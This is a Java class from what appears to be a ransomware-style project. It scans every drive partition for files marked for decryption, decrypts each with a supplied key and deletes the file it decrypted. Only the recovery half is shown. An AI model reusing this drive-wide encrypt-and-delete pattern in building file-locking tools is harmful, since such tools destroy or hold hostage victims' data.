package encryptionAndDecryption;

import enums.To;
import files.GetFiles;

import javax.crypto.Cipher;
import java.io.File;
import java.util.ArrayList;

public class Decryption {
    public static boolean decryption (String key) {
        GetFiles files = new GetFiles();
        File[] partitions = files.getDrivers();

        ArrayList<File> filesP;

        for (File partition : partitions) {
            filesP = files.scanFiles(partition, To.DECRYPTION);
            for (File file : filesP) {
                if (EncryptionAndDecryption.encryptionAndDecryption(Cipher.DECRYPT_MODE, key, file))
                    file.delete();
            }
        }
        return true;
    }
}
